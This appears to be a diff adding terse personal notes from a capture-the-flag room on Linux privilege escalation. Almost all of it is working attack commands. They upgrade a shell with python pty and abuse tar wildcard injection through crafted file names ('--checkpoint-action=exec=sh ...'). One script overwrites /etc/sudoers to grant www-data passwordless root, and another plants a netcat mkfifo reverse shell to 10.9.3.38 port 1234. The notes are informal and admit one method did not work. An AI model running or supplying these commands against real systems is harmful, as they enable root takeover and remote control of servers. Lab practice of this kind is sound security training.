@@ -1,0 +1,20 @@
+drop shell then input python command
+
+python -c 'import pty;pty.spawn("/bin/bash")';
+
+move to directory  /var/www/html
+
+then input these ,,,
+
+echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
+echo "/var/www/html"  > "--checkpoint-action=exec=sh privesc.sh"
+echo "/var/www/html"  > --checkpoint=1
+
+wait a minute ,,, the type sudo -|
+
+from room writeup  /// didn't really worked
+
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.3.38
+1234 >/tmp/f" > shell.sh
+touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
+touch "/var/www/html/--checkpoint=1"
